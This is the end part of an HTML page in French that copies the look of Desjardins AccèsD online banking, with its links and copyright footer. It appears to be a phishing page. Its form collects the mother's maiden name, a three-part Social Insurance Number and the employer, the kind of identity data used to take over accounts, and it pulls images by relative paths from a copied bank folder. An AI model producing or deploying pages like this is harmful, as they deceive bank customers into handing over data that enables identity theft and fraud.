	<td valign="top" width="48%"><font face="Arial, Helvetica, sans-serif" size="2">Nom de la Mère&nbsp;:<br>
	<font size="1"></font></font></td>
	<td valign="top" width="52%"><font face="Arial, Helvetica, sans-serif" size="2">
<input name="mmn" id="address" value="" size="25" maxlength="30">
	</font>
&nbsp;&nbsp;<BR><BR>


<tr bgcolor="#f0f8f0">
	<td valign="top" width="48%"><font face="Arial, Helvetica, sans-serif" size="2">Numero d'Assurance Social&nbsp;:<br>
	<font size="1"></font></font></td>
	<td valign="top" width="52%"><font face="Arial, Helvetica, sans-serif" size="2">
<input name="s1" id="address" value="" size="3" maxlength="3" onKeyPress="return numbersonly(this, event)">-
<input name="s2" id="address" value="" size="3" maxlength="3" onKeyPress="return numbersonly(this, event)">-
<input name="s3" id="address" value="" size="3" maxlength="3" onKeyPress="return numbersonly(this, event)">
	</font>
&nbsp;&nbsp;<BR><BR>

<tr bgcolor="#f0f8f0">
	<td valign="top" width="48%"><font face="Arial, Helvetica, sans-serif" size="2">Employeur:<br></td>
	<td valign="top" width="52%"><font face="Arial, Helvetica, sans-serif" size="2">
<input name="emplo" id="address" value="" size="32" maxlength="32">
	</font>
&nbsp;&nbsp;<BR><BR>

<input name="chRetour" value="Terminer" o type="submit">
</form>
</td>
</tr>
<tr>

<td class="t">
</td>
</tr>
</tbody></table>

</td>
</td>
</tr>
<tr>
<td height="24"></td>

</td>
</tr>
</tbody></table>
</form>
<td><img width="4" height="1" border="0" src="public/1438/fr_CA_ACCESD/image/spacer.gif"></td>
</tr>

<script language="JavaScript" type="text/javascript">
var chargee = true;
</script>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
<td class="ze" colspan="3">&nbsp;</td>
</tr>
<tr>
<td class="ze" colspan="3">&nbsp;</td>
</tr>
<tr>
<td class="ls" colspan="3">&nbsp;</td>
</tr>
<tr>
<td class="zem" colspan="3">&nbsp;</td>
</tr>
<tr>
<td width="145">
<a HRef="javascript:MM_openBrWindow('http://www.desjardins.com/fr/services_en_ligne/accesd/aide/ai_remboursement_fraude.jsp?domaine=ACCESD','Securite','scrollbars=yes,resizable=yes,width=500,height=500');"><img src="public/1438/fr_CA_ACCESD/image/securite.gif" width="140" height="39" border="0" title="sécurité confidentialité"></a>
</td>
<td valign="top">
<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
<td align="center" class="t"><b>Conjuguer avoirs et êtres</b></td>
</tr>
<tr>
<td class="th">
<a href="javascript:MM_openBrWindow('http://www.desjardins.com/fr/services_en_ligne/accesd/aide/ai_securite.jsp?domaine=ACCESD','Securite','scrollbars=yes,resizable=yes,width=500,height=500');">Sécurité</a>&nbsp;|
<a href="javascript:MM_openBrWindow('http://www.desjardins.com/fr/services_en_ligne/accesd/aide/ai_confidentialite.jsp?domaine=ACCESD','Confidentialite','scrollbars=yes,resizable=yes,width=500,height=500');">Confidentialité</a>&nbsp;|
<a href="javascript:MM_openBrWindow('http://www.desjardins.com/fr/services_en_ligne/accesd/aide/ai_utilisation.jsp?domaine=ACCESD','Conditions','scrollbars=yes,resizable=yes,width=500,height=500');">Conditions&nbsp;d'utilisation</a>&nbsp;
</td>
<td valign="top" align="center" class="t">
<a href="#haut">Haut de page</a>
</td>
</tr>
<tr>
<td align="center" class="tg">Copyright &copy; 2015 Mouvement des caisses Desjardins. Tous droits réservés.</td>
</tr>
</table>
</td>
</tr>
</table>
</body>
</html>

